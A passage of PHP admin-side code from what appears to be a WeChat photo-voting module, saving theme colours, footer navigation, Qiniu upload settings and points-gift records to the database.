			'topbgsoinputtextcolor' => $_GPC['topbgsoinputtextcolor'],
			'topbgsoancolor' => $_GPC['topbgsoancolor'],
			'topbgsoantextcolor' => $_GPC['topbgsoantextcolor'],
			'topbgsodescolor' => $_GPC['topbgsodescolor'],
		);
		$insert_body['rbody_photosvote'] = iserializer($rbody_photosvote);
		$rbody_tuser = array(
			'tuser_bgcolor' => $_GPC['tuser_bgcolor'],
			'tuser_tj_bgcolor' => $_GPC['tuser_tj_bgcolor'],
			'tuser_tj_bgimg' => $_GPC['tuser_tj_bgimg'],
			'tuser_tj_text_color' => $_GPC['tuser_tj_text_color'],
			'tuser_tj_num_color' => $_GPC['tuser_tj_num_color'],
			'tuser_level_bg_color' => $_GPC['tuser_level_bg_color'],
			'tuser_level_text_color' => $_GPC['tuser_level_text_color'],
			'tuser_level_num_color' => $_GPC['tuser_level_num_color'],
			'tuser_xq_title_color' => $_GPC['tuser_xq_title_color'],
			'tuser_xq_title_down_color' => $_GPC['tuser_xq_title_down_color'],
			'tuser_xq_title_ck_color' => $_GPC['tuser_xq_title_ck_color'],
			'tuser_xq_content_color' => $_GPC['tuser_xq_content_color'],
			'tuser_xq_jg_color' => $_GPC['tuser_xq_jg_color'],
			'tuser_xq_bg_color' => $_GPC['tuser_xq_bg_color'],
			'tuser_bottom_text_color' => $_GPC['tuser_bottom_text_color'],
			'tuser_bottom_yuan_text_color' => $_GPC['tuser_bottom_yuan_text_color'],
			'tuser_bottom_yuan_image' => $_GPC['tuser_bottom_yuan_image'],
			'tuser_bottom_yuan_bg_color' => $_GPC['tuser_bottom_yuan_bg_color'],
			'tuser_bottom_yuan_border_color' => $_GPC['tuser_bottom_yuan_border_color'],
			'tuser_bottom_bg_color' => $_GPC['tuser_bottom_bg_color'],
		);
		$insert_body['rbody_tuser'] = iserializer($rbody_tuser);
		$rbody_paihang = array(
			'paihang_bgcolor' => $_GPC['paihang_bgcolor'],
			'paihang_bgimg' => $_GPC['paihang_bgimg'],
			'paihang_tj_bgcolor' => $_GPC['paihang_tj_bgcolor'],
			'paihang_tj_bgimg' => $_GPC['paihang_tj_bgimg'],
			'paihang_tj_text_color' => $_GPC['paihang_tj_text_color'],
			'paihang_tj_num_color' => $_GPC['paihang_tj_num_color'],
			'paihang_tp_title_color' => $_GPC['paihang_tp_title_color'],
			'paihang_tp_xin_img' => $_GPC['paihang_tp_xin_img'],
			'paihang_tp_tag_text_color' => $_GPC['paihang_tp_tag_text_color'],
			'paihang_tp_tag_an_text_color' => $_GPC['paihang_tp_tag_an_text_color'],
			'paihang_tp_tag_an_color' => $_GPC['paihang_tp_tag_an_color'],
			'paihang_tp_tag_an_img' => $_GPC['paihang_tp_tag_an_img'],
			'paihang_tp_tag_color' => $_GPC['paihang_tp_tag_color'],
			'paihang_tp_color' => $_GPC['paihang_tp_color'],
			'paihang_tp_user_bg_color' => $_GPC['paihang_tp_user_bg_color'],
			'paihang_tp_user_text_color' => $_GPC['paihang_tp_user_text_color'],
			'paihang_tp_user_num_color' => $_GPC['paihang_tp_user_num_color'],
			'paihang_tp_alluser_text_color' => $_GPC['paihang_tp_alluser_text_color'],
			'paihang_tp_alluser_num_color' => $_GPC['paihang_tp_alluser_num_color'],
			'paihang_tp_more_color' => $_GPC['paihang_tp_more_color'],
			'paihang_tp_more_bg_color' => $_GPC['paihang_tp_more_bg_color'],
		);
		$insert_body['rbody_paihang'] = iserializer($rbody_paihang);
		$rbody_reg = array(
			'reg_bgcolor' => $_GPC['reg_bgcolor'],
			'reg_bgimg' => $_GPC['reg_bgimg'],
			'reg_sh_bgcolor' => $_GPC['reg_sh_bgcolor'],
			'reg_sh_bottm_border_color' => $_GPC['reg_sh_bottm_border_color'],
			'reg_sh_text_color' => $_GPC['reg_sh_text_color'],
			'reg_xx_title_color' => $_GPC['reg_xx_title_color'],
			'reg_xx_bg_color' => $_GPC['reg_xx_bg_color'],
			'reg_xx_border_color' => $_GPC['reg_xx_border_color'],
			'reg_xx_input_text_color' => $_GPC['reg_xx_input_text_color'],
			'reg_xx_input_bg_color' => $_GPC['reg_xx_input_bg_color'],
			'reg_xx_input_jg_color' => $_GPC['reg_xx_input_jg_color'],
			'reg_xx_jg_color' => $_GPC['reg_xx_jg_color'],
			'reg_xx_save_bg_color' => $_GPC['reg_xx_save_bg_color'],
			//'reg_xx_save_top_color' => $_GPC['reg_xx_save_top_color'],
			'reg_xx_save_an_bg_color' => $_GPC['reg_xx_save_an_bg_color'],
			'reg_xx_save_an_text_color' => $_GPC['reg_xx_save_an_text_color'],
		);
		$insert_body['rbody_reg'] = iserializer($rbody_reg);
		$rbody_des = array(
			'des_bgcolor' => $_GPC['des_bgcolor'],
			'des_bgimg' => $_GPC['des_bgimg'],
			'des_tj_bgcolor' => $_GPC['des_tj_bgcolor'],
			'des_tj_bgimg' => $_GPC['des_tj_bgimg'],
			'des_tj_text_color' => $_GPC['des_tj_text_color'],
			'des_tj_num_color' => $_GPC['des_tj_num_color'],
			'des_des_title_color' => $_GPC['des_des_title_color'],
			'des_des_xin_img' => $_GPC['des_des_xin_img'],
			'des_des_text_color' => $_GPC['des_des_text_color'],
			'des_des_bg_color' => $_GPC['des_des_bg_color'],
		);
		$insert_body['rbody_des'] = iserializer($rbody_des);
		$rbody_tags = array(
			'tags_bgcolor' => $_GPC['tags_bgcolor'],
			'tags_bgimg' => $_GPC['tags_bgimg'],
			'tags_tj_bgcolor' => $_GPC['tags_tj_bgcolor'],
			'tags_tj_bgimg' => $_GPC['tags_tj_bgimg'],
			'tags_tj_text_color' => $_GPC['tags_tj_text_color'],
			'tags_tj_num_color' => $_GPC['tags_tj_num_color'],
			'tags_tags_title_color' => $_GPC['tags_tags_title_color'],
			'tags_tags_xin_img' => $_GPC['tags_tags_xin_img'],
			'tags_tags_text_color' => $_GPC['tags_tags_text_color'],
			'tags_an_text_color' => $_GPC['tags_an_text_color'],
			'tags_an_bg_color' => $_GPC['tags_an_bg_color'],
			'tags_tags_bg_color' => $_GPC['tags_tags_bg_color'],
		);
		$insert_body['rbody_tags'] = iserializer($rbody_tags);
		$qxbfooter = array(
			//'isqiniu' => $_GPC['isqiniu'] =='on' ? 1 : 0,
			'nav_name_a' => $_GPC['nav_name_a'],
			'nav_name_b' => $_GPC['nav_name_b'],
			'nav_name_c' => $_GPC['nav_name_c'],
			'nav_name_d' => $_GPC['nav_name_d'],
			'nav_name_da' => $_GPC['nav_name_da'],
			'nav_name_db' => $_GPC['nav_name_db'],
			'nav_name_dc' => $_GPC['nav_name_dc'],
			'nav_url_a' => $_GPC['nav_url_a'],
			'nav_url_b' => $_GPC['nav_url_b'],
			'nav_url_c' => $_GPC['nav_url_c'],
			'nav_url_d' => $_GPC['nav_url_d'],
			'nav_url_da' => $_GPC['nav_url_da'],
			'nav_url_db' => $_GPC['nav_url_db'],
			'nav_url_dc' => $_GPC['nav_url_dc'],
			'nav_ico_a' => $_GPC['nav_ico_a'],
			'nav_ico_b' => $_GPC['nav_ico_b'],
			'nav_ico_c' => $_GPC['nav_ico_c'],
			'nav_ico_d' => $_GPC['nav_ico_d'],
			'nav_ico_da' => $_GPC['nav_ico_da'],
			'nav_ico_db' => $_GPC['nav_ico_db'],
			'nav_ico_dc' => $_GPC['nav_ico_dc']
		);
		$insert_body['qxbfooter'] = iserializer($qxbfooter);
		if (!empty($rbody['rid'])) {
			pdo_update($this->table_reply_body, $insert_body, array('rid' => $rid));
		} else {
			pdo_insert($this->table_reply_body, $insert_body);
		}
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rcustom') {
	$rcustom = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_body)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$qxbfooter = iunserializer($rcustom['qxbfooter']);
/*	$foo = empty($_GPC['foo']) ? '' : $_GPC['foo'] ;
	$qxbfooter = iunserializer($rcustom['qxbfooter']);
	$rmore = iunserializer($qxbfooter['nav_more']);
	if ($foo == 'edit') {
		if (checksubmit('submit')) {
			$rmoredate = array(
				'type' => 'qxbfooter',
			);
			if (!empty($rcustom['rid'])) {
				pdo_update($this->table_reply_custom, $date, array('rid' => $rid));
			} else {
				pdo_insert($this->table_reply_custom, $date);
			}

		}
	}else{


	}*/
	if (checksubmit('submit')) {
		$date = array(
			'rid' => $rid,
			//'type' => 'qxbfooter',
		);

		$qxbfooter = array(
			//'isqiniu' => $_GPC['isqiniu'] =='on' ? 1 : 0,
			'nav_name_a' => $_GPC['nav_name_a'],
			'nav_name_b' => $_GPC['nav_name_b'],
			'nav_name_c' => $_GPC['nav_name_c'],
			'nav_name_d' => $_GPC['nav_name_d'],
			'nav_name_da' => $_GPC['nav_name_da'],
			'nav_name_db' => $_GPC['nav_name_db'],
			'nav_name_dc' => $_GPC['nav_name_dc'],
			'nav_url_a' => $_GPC['nav_url_a'],
			'nav_url_b' => $_GPC['nav_url_b'],
			'nav_url_c' => $_GPC['nav_url_c'],
			'nav_url_d' => $_GPC['nav_url_d'],
			'nav_url_da' => $_GPC['nav_url_da'],
			'nav_url_db' => $_GPC['nav_url_db'],
			'nav_url_dc' => $_GPC['nav_url_dc'],
			'nav_ico_a' => $_GPC['nav_ico_a'],
			'nav_ico_b' => $_GPC['nav_ico_b'],
			'nav_ico_c' => $_GPC['nav_ico_c'],
			'nav_ico_d' => $_GPC['nav_ico_d'],
			'nav_ico_da' => $_GPC['nav_ico_da'],
			'nav_ico_db' => $_GPC['nav_ico_db'],
			'nav_ico_dc' => $_GPC['nav_ico_dc']
		);
		$date['qxbfooter'] = iserializer($qxbfooter);
		if (!empty($rcustom['rid'])) {
			pdo_update($this->table_reply_body, $date, array('rid' => $rid));
		} else {
			pdo_insert($this->table_reply_body, $date);
		}
		message('更新成功！', referer(), 'success');
	}

} elseif ($op == 'rupload') {
	$rbasic = pdo_fetch("SELECT qiniu FROM ".tablename($this->table_reply)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$qiniu = iunserializer($rbasic['qiniu']);
	$qiniu['videologo'] = empty($qiniu['videologo']) ? FM_PHOTOSVOTE_RESOURCE_URL."static/logo.png" : $qiniu['videologo'];
	if (checksubmit('submit')) {
		$qiniu = array(
			'isqiniu' => $_GPC['isqiniu'] =='on' ? 1 : 0,
			'accesskey' => htmlspecialchars_decode($_GPC['accesskey']),
			'secretkey' => htmlspecialchars_decode($_GPC['secretkey']),
			'qnlink' => htmlspecialchars_decode($_GPC['qnlink']),
			'bucket' => htmlspecialchars_decode($_GPC['bucket']),
			'pipeline' => htmlspecialchars_decode($_GPC['pipeline']),
			'aq' => htmlspecialchars_decode($_GPC['aq']),
			'videofbl' => htmlspecialchars_decode($_GPC['videofbl']),
			'videologo' => htmlspecialchars_decode($_GPC['videologo']),
			'wmgravity' => htmlspecialchars_decode($_GPC['wmgravity']),
		);
		$insert_basic['qiniu'] = iserializer($qiniu);
		pdo_update($this->table_reply, $insert_basic, array('rid' => $rid));
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rjifen') {
	$rjifen = pdo_fetch("SELECT * FROM ".tablename($this->table_jifen)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$rjifen_gift = pdo_fetchall("SELECT * FROM ".tablename($this->table_jifen_gift)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	load()->func('tpl');
	if ($_GPC['giftdel']) {
		$gift = pdo_fetch("SELECT * FROM ".tablename($this->table_jifen_gift)." WHERE id = :id ORDER BY `id` DESC", array(':id' => $_GPC['id']));
		if (empty($gift)) {
			$msg = '此礼物不存在！';
			$fmdata = array(
				"success" => -1,
				"msg" => $msg,
			);
			echo json_encode($fmdata);
			exit();
		}
		pdo_delete($this->table_jifen_gift, array('id'=>$_GPC['id']));
		$msg = '删除成功！';
		$fmdata = array(
			"success" => 1,
			"msg" => $msg,
		);
		echo json_encode($fmdata);
		exit();
	}
	if ($_GPC['savegift']) {
		$gift = pdo_fetch("SELECT * FROM ".tablename($this->table_jifen_gift)." WHERE id = :id ORDER BY `id` DESC", array(':id' => $_GPC['giftid']));
		$insert_gift = array(
			'rid' => $rid,
			'uniacid' => $uniacid,
			'gifttitle' => $_GPC['gifttitle'],
			'images' => $_GPC['images'],
			'jifen' => $_GPC['jifen'],
			'piaoshu' => $_GPC['piaoshu'],
			'description' => $_GPC['description'],
			'createtime' => time(),
		);
		if (empty($gift)) {
			pdo_insert($this->table_jifen_gift, $insert_gift);
		}else{
			pdo_update($this->table_jifen_gift, $insert_gift, array('id' => $gift['id']));
		}

		$msg = '更新成功！';
		$fmdata = array(
			"success" => 1,
			"msg" => $msg,
		);
		echo json_encode($fmdata);
		exit();
	}
	if ($_GPC['edit']) {
		$gift = pdo_fetch("SELECT * FROM ".tablename($this->table_jifen_gift)." WHERE id = :id ORDER BY `id` DESC", array(':id' => $_GPC['giftid']));
		if (empty($gift)) {
			$msg = '此礼物不存在！';
			$fmdata = array(
				"success" => -1,
				"msg" => $msg,
			);
			echo json_encode($fmdata);
			exit();
		}
		$giftdate = array(
			'id' => $gift['id'],
			'gifttitle' => $gift['gifttitle'],
			'images' => $gift['images'],
			'dqimages' => tomedia($gift['images']),
			'jifen' => $gift['jifen'],
			'piaoshu' => $gift['piaoshu'],
			'description' => $gift['description'],
			'createtime' => $gift['createtime'],
		);
		$fmdata = array(
			"success" => 1,
			"gift" => $giftdate,
		);
		echo json_encode($fmdata);
		exit();
	}
	if (checksubmit('submit')) {
		$insert_jifen = array(
			'rid' => $rid,
			'uniacid' => $uniacid,
			'is_open_jifen' => $_GPC['is_open_jifen'] == 'on' ? 1 : 0,
			'is_open_jifen_sync' => $_GPC['is_open_jifen_sync'] == 'on' ? 1 : 0,
			'is_open_choujiang' => $_GPC['is_open_choujiang'],
			'jifen_vote' => $_GPC['jifen_vote'],
			'jifen_vote_reg' => $_GPC['jifen_vote_reg'],
			'jifen_reg' => $_GPC['jifen_reg'],
			'jifen_charge' => $_GPC['jifen_charge'],
			'jifen_gift_times' => $_GPC['jifen_gift_times']
		);
		if (!empty($rjifen['rid'])) {
			pdo_update($this->table_jifen, $insert_jifen, array('rid' => $rid));
		} else {
			pdo_insert($this->table_jifen, $insert_jifen);
		}
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rstar') {

}

include $this->template('web/system');